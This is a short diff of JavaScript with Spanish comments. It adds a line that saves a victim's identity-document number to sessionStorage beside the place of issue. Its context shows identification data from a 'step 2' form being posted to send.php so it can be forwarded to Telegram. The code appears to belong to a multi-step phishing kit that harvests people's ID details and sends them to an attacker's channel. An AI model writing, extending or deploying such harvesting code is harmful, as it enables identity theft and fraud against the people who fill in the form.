@@ -125,6 +125,7 @@
 
     // Guardar para validación posterior en validacion.html
     sessionStorage.setItem('lugarExp', data.lugarExp);
+    sessionStorage.setItem('numDoc', data.numDoc);
 
     // Enviar a Telegram solo los datos de identificación (paso2)
     fetch('send.php', {
